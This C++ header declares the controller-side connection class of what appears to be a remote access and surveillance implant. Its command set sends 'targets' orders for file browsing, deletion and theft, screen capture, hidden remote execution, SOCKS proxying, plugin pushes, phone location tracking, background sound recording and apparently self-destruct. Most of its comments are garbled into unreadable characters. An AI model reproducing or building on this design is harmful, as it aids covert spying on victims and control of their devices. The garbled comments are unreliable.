
//---------------------------------------------------------------------------

#ifndef TargetConnectionH
#define TargetConnectionH
//---------------------------------------------------------------------------
#include "connection.h"
#include "target.h"

class TargetConnection;
//---------------------------------------------------------------------------

class TargetConnection : public Connection
{
public:
     TargetConnection(SOCKET sock, DWORD dwTargetId);
     ~TargetConnection();
      
	 void FlowStatistics(unsigned int bytes);

protected:

	virtual void  HandleIncomingData();
    virtual void  ConnectionCompleted();
    virtual void  ConnectionClosed();

public:

	void  Send_Identity();
	void  Send_HEL();
	void  Send_INI();
	void  Send_FLD();

	void Send_IDE(const char* password);

	// ��ѯ��������ת������Ǩ����Ϣ
	//
	void  Send_QDA(ULONG targetId);
	void  Send_SDA(PBYTE lpData, DWORD dwDataSize);

	void  Send_SDA(ULONG targetId, DWORD value);

	// ������
	//
	void  Send_PLI(ULONG targetId);       // ��ѯ�����Ϣ
	void  Send_PLD(ULONG targetId, ULONG pluginId, PBYTE data, ULONG dataLen);       // ���ò������
	void  StartUptPluginToDaemon(DWORD dwPluginId, DWORD dwNewPlgVer, DWORD dwOsType);
	void  Send_UPL(DWORD       dwPluginId,
		DWORD       dwNewPlgVer,
		DWORD       dwStartPos,                             
		std::string flag,
		PCHAR       lpData,
		DWORD       dwDataLen,
		DWORD		 dwOsType);

	void  Send_STA(ULONG targetId);       // ��ѯĿ��״̬
	void  Send_PNG();                     // ������Ӧ

	void  Send_LIR(ULONG targetId);                       // ��ѯĿ���̷��б�
	void  Send_DIR(ULONG targetId,   const char *base64Path);     // ��ѯĿ��Ŀ¼��Ϣ
	void  Send_FDL(ULONG targetId,   const char *base64Path);     // ɾ��Ŀ���ϵ�ĳ���ļ�

	// Ŀ�����: �Ի١���Ĭ�����
	//
	void  Send_ERA(ULONG targetId);
	void  Send_SDS(ULONG targetId);
	void  Send_SIL(ULONG targetId, FILETIME &ftBeg, FILETIME &ftEnd);

	// ����
	//
	void  Send_SCP(ULONG  targetID);

	// ��������
	//
	void  Send_OSC(ULONG          targetID,
		ULONG          osId,
		const char*          tarDirPathBase64,
		ULONG          level,
		PSearchFilter  lpSearchFilter);                    // ��������

	void  Send_OSF(ULONG          targetID,
		ULONG          osId);                              // ֹͣ����

	// Socks����
	//
	void  Send_SSX(ULONG ulTargetID,  USHORT usPort); // ����
	void  Send_SSX(ULONG ulTargetID,  USHORT usPort, PCHAR lpszUser, PCHAR lpszPass); // ����
	void  Send_ESX(ULONG ulTargetID);                                 // ֹͣ

	// plugin manager cmd (direct to target)
	//
	void  Send_PLG(ULONG targetId, ULONG   pluginId, char    *plgType);

	void  Send_CRP(Target *tarBlock, std::wstring procPath, BOOL bHideExec);

	// Զ����չִ��
	//
	void  Send_RUN(DWORD dwTargetId, std::wstring procPath, BOOL bRedirectIO);
	void  Send_CITW(DWORD dwTargetID, std::wstring widInput);
	void  Send_CITA(DWORD dwTargetID, std::string aniInput);
	void  Send_CFI(DWORD dwTargetID);

	// �ļ����
	void Send_FMT(DWORD dwTargetId, std::wstring path, ULONG add, std::wstring ext);

	// ��ȡ���ڵأ��ֻ�ר�ã�
	void Send_GPRS(DWORD dwTargetId);
	int Handle_GPRS(std::vector<std::string> & args);

	// �Զ���ȡ
	void Send_AGT(
		ULONG      targetID,
		TaskDirect taskDirect,
		const char*      tarDirPathBase64,
		ULONG      level,
		ULONG      autoDown);

	// ������
	void Send_BACKSOUND(ULONG targetID, bool open, ULONG time);

    // FileTask
    //
    void  Send_FTK(ULONG targetId, ULONG taskId);     // ��ѯ FileTask (taskIDΪ0��˵����ѯȫ��0
    void  Send_DTK(ULONG targetId, ULONG taskId, BOOL bDetail);                   // ��ѯ DirTask
    void  Send_STK(ULONG targetId, ULONG taskId);                   // ��ѯ SearchTask

    void  Send_AFT(ULONG        targetID,
                             TaskDirect   taskDirect,
                             const char*        ctrPathBase64,
                             const char*        tarPathBase64,
                             ULONG        totalLen);                // ���� FileTask
                             
    void  Send_ADT(ULONG      targetID,
                             TaskDirect taskDirect,
                             const char*      tarDirPathBase64,
                             ULONG      level,
                             ULONG      autoDown);                  // ���� DirTask

    void  Send_AST(ULONG          targetID,
                             TaskDirect     taskDirect,
                             PCHAR          tarDirPathBase64,
                             ULONG          level,
                             PSearchFilter  lpSearchFilter,
                             ULONG          autoDown);                  // ����SearchTask

    void  Send_CFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // ��� Task
    void  Send_PFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // ��ͣ Task
    void  Send_RFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // ���� Task
    void  Send_DFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType);   // ֪ͨ Daemonֱ��ɾ�� Task
    
    // file task manager
    //
    void  Start_UPL(FileTask *fileTask);
    void  Send_UPL(FileTask *fileTask, std::string flag, ULONG dataLen);
    void  Send_DOW(DWORD dwTaskId, int startPos, std::string pathBase64);
    void  Send_ERR(FileTask *fileTask);
    
private:

	// static std::map<std::string,TargetCmdHandler > commandHandlers;
                                                  
    int   DispatchCommand(std::vector<std::string> & args);
    void  RegisterCommandHandlers();

    //int   Handle_HEL(std::vector<std::string> & args);
    int   Handle_QNG(std::vector<std::string> & args);

    // FileTask���ָ����ͺ���
    //
    int   Handle_SCH(std::vector<std::string> & args);    // ���µ���
    int   Handle_FTS(std::vector<std::string> & args);

    int   Handle_FTK(std::vector<std::string> & args);
    int   Handle_DTK(std::vector<std::string> & args);
    int   Handle_STK(std::vector<std::string> & args);

    int   Handle_AFT(std::vector<std::string> & args);
    int   Handle_ADT(std::vector<std::string> & args);
    int   Handle_AST(std::vector<std::string> & args);

    int   Handle_CFT(std::vector<std::string> & args);
    int   Handle_PFT(std::vector<std::string> & args);
    int   Handle_RFT(std::vector<std::string> & args);
        
    // �ļ��ϴ�����
    //
	int   Handle_DOW(std::vector<std::string> & args);
	int   Handle_UPL(std::vector<std::string> & args);
    int   Handle_FDT(std::vector<std::string> & args);    // �ļ�ʱ����Ϣ

    // Plugin Section
    //
    int   Handle_Plugin_CMD(std::vector<std::string> &args);

	int   Handle_OUT(std::vector<std::string> & args);

	int   Handle_INI(std::vector<std::string> & args);
	int   Handle_TAR(std::vector<std::string> & args);
	int   Handle_CIN(std::vector<std::string> & args);
	int   Handle_STA(std::vector<std::string> & args);
	int   Handle_LOG(std::vector<std::string> & args);

	int   Handle_TSW(std::vector<std::string> & args);

	int   Handle_QDA(std::vector<std::string> & args);

	int   Handle_LIR(std::vector<std::string> & args);
	int   Handle_DIR(std::vector<std::string> & args);
	int   Handle_FDL(std::vector<std::string> & args);

	// ����
	//
	int   Handle_SCP(std::vector<std::string> & args);

	// ��������
	//
	int   Handle_OSC(std::vector<std::string> & args);            // ��������
	int   Handle_OSF(std::vector<std::string> & args);            // �˹�ֹͣ�����
	int   Handle_OSI(std::vector<std::string> & args);            // �õ�������

	// Socks����
	//
	int   Handle_SSX(std::vector<std::string> & args);
	int   Handle_ESX(std::vector<std::string> & args);

	// ������
	//
	int   Handle_PLI(std::vector<std::string> & args);
	int   Handle_PLD(std::vector<std::string> & args);

	int   Handle_PLG(std::vector<std::string> & args);

	int   Handle_CRP(std::vector<std::string> & args);
	int   Handle_RUN(std::vector<std::string> & args);
	int   Handle_CIT(std::vector<std::string> & args);            // Console Input
	int   Handle_COT(std::vector<std::string> & args);            // Console Output
	int   Handle_CFI(std::vector<std::string> & args);            // Console Finished

	int   Handle_ERA(std::vector<std::string> & args);
	int   Handle_SDS(std::vector<std::string> & args);
	int   Handle_SIL(std::vector<std::string> & args);

	// �ļ����
	int Handle_FMT(std::vector<std::string> &args);

	// ������
	int Handle_BACKSOUND(std::vector<std::string>& args);

public:

    Target      *ownerTarget;
    char        *readBuf;           // For File Read

	CRITICAL_SECTION csTarConn;
	HANDLE ftkHandle;
};

typedef int  (TargetConnection::* TargetCmdHandler)(std::vector<std::string> &);

#endif
